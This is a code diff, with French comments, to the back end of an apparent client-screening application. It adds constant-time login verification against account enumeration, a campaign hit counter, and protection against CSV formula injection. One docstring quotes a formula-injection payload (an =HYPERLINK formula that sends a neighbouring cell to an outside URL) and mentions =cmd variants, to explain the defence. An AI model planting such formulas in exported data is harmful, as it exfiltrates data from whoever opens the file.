@@ -7,6 +7,7 @@ import re
 import asyncio
 import hashlib
 import heapq
+import secrets
 import logging
 import shutil
 import threading
@@ -1227,6 +1228,12 @@ class LoginRequest(BaseModel):
 
 # ------------------ AUTHENTICATION ENDPOINTS ------------------
 
+# Empreinte d'un mot de passe aleatoire, calculee une fois au demarrage. Elle
+# ne correspond a aucun compte : elle sert uniquement a faire payer au chemin
+# « compte inexistant » le meme temps de calcul qu'au chemin normal.
+_EMPREINTE_FACTICE = hash_password(secrets.token_urlsafe(32))
+
+
 @app.post("/api/auth/login")
 async def login(
     request: Request,
@@ -1271,7 +1278,25 @@ async def login(
                          target=request_data.username, detail=f"{reason} (IP {client_ip})")
         db.commit()
 
-    if not user or not verify_password(request_data.password, user.hashed_password, user.salt):
+    # Verification a COUT CONSTANT, que le compte existe ou non.
+    #
+    # `verify_password` derive PBKDF2-SHA256 sur 100 000 iterations : 67 ms
+    # mesurees. En court-circuitant sur un compte inexistant, la reponse
+    # revenait en quelques millisecondes au lieu de 67 — ecart trivialement
+    # observable sur le reseau, donc enumeration des comptes valides. Le
+    # message d'erreur, lui, etait deja identique dans les deux cas ; c'est le
+    # chronometre qui parlait.
+    #
+    # Un compte inconnu fait donc verifier une empreinte factice : meme calcul,
+    # meme duree, meme reponse.
+    if user:
+        mot_de_passe_valide = verify_password(
+            request_data.password, user.hashed_password, user.salt)
+    else:
+        verify_password(request_data.password, *_EMPREINTE_FACTICE)
+        mot_de_passe_valide = False
+
+    if not mot_de_passe_valide:
         _register_failure("Mot de passe incorrect")
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
@@ -4745,7 +4770,8 @@ def _campaign_summary(c: BatchCampaign) -> Dict[str, Any]:
         "status": c.status, "error_message": c.error_message,
         "screening_lists": c.screening_lists or "ALL",
         "total_clients": c.total_clients, "processed_clients": c.processed_clients,
-        "alert_count": c.alert_count, "no_match_count": c.no_match_count,
+        "alert_count": c.alert_count, "hits_count": c.hits_count or 0,
+        "no_match_count": c.no_match_count,
         "rejected_count": c.rejected_count,
         "created_by": c.created_by,
         "created_at": c.created_at.isoformat() if c.created_at else None,
@@ -4783,6 +4809,10 @@ def _run_batch_campaign(campaign_id: int, profiles: List[Dict[str, Any]],
                     audit_id=result.get("audit_trail_id"),
                     alert_id=result.get("alert_id"),
                 ))
+                # Correspondances effectivement ouvertes par ce client : le
+                # criblage en ouvre une par correspondance au-dessus du seuil.
+                campaign.hits_count = (campaign.hits_count or 0) + int(
+                    (result.get("hits") or {}).get("hits", 0))
                 if result_status == "ALERT":
                     campaign.alert_count += 1
                 else:
@@ -4803,13 +4833,17 @@ def _run_batch_campaign(campaign_id: int, profiles: List[Dict[str, Any]],
         campaign.status = "DONE"
         campaign.finished_at = datetime.utcnow()
         db.commit()
-        logger.info(f"Campagne batch #{campaign_id} terminée : {campaign.alert_count} alerte(s) "
+        logger.info(f"Campagne batch #{campaign_id} terminée : "
+                    f"{campaign.alert_count} client(s) en alerte, "
+                    f"{campaign.hits_count or 0} correspondance(s) ouverte(s), "
                     f"sur {campaign.processed_clients} client(s).")
         emit(db, "batch_campaign_done", {
             "_actor": campaign.created_by,
             "Campagne": f"#{campaign.id} {campaign.name}",
             "Déclencheur": campaign.trigger, "Clients criblés": campaign.processed_clients,
-            "Alertes": campaign.alert_count, "Sans correspondance": campaign.no_match_count,
+            "Clients en alerte": campaign.alert_count,
+            "Alertes ouvertes": campaign.hits_count or 0,
+            "Sans correspondance": campaign.no_match_count,
             "Fiches rejetées": campaign.rejected_count,
             "Lancée par": campaign.created_by,
         })
@@ -5776,14 +5810,44 @@ async def get_client_overview(
 
 # ------------------ EXPORTS CSV (alertes, journal d'audit, listes) ------------------
 
+# Caracteres qui, en TETE d'une cellule, font interpreter celle-ci comme une
+# FORMULE par Excel, LibreOffice et Google Sheets.
+_CSV_DEBUTS_DANGEREUX = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_neutralise(valeur):
+    """
+    Neutralise l'injection de formules dans une cellule.
+
+    Ces exports sont faits POUR etre ouverts dans Excel (BOM UTF-8, separateur
+    « ; »), et leur contenu vient de l'exterieur : noms de fiches listees
+    telechargees, referentiel clients importe par CSV, parties de messages de
+    paiement ISO 20022, commentaires d'analystes. Une cellule commencant par
+    « = » est executee a l'ouverture — `=HYPERLINK("http://…"&A1,"…")` exfiltre
+    la ligne voisine d'un simple clic, et les variantes `=cmd|…` vont plus loin.
+
+    Le prefixe apostrophe est la parade usuelle (OWASP) : le tableur affiche la
+    valeur telle quelle et ne l'evalue pas. La donnee n'est pas alteree, elle
+    est marquee comme texte.
+    """
+    if not isinstance(valeur, str) or not valeur:
+        return valeur
+    return "'" + valeur if valeur[0] in _CSV_DEBUTS_DANGEREUX else valeur
+
+
 def _csv_response(filename: str, header: List[str], rows) -> Response:
-    """CSV « ; » avec BOM UTF-8 : ouverture directe dans Excel FR."""
+    """CSV « ; » avec BOM UTF-8 : ouverture directe dans Excel FR.
+
+    Toutes les cellules passent par `_csv_neutralise` : c'est le point de
+    passage unique de tous les exports, donc le seul endroit ou cette garantie
+    doit tenir.
+    """
     import csv as _csv
     import io
     buffer = io.StringIO()
     writer = _csv.writer(buffer, delimiter=";")
-    writer.writerow(header)
-    writer.writerows(rows)
+    writer.writerow([_csv_neutralise(c) for c in header])
+    writer.writerows([_csv_neutralise(c) for c in ligne] for ligne in rows)
     return Response(
         content="\ufeff" + buffer.getvalue(),
         media_type="text/csv; charset=utf-8",
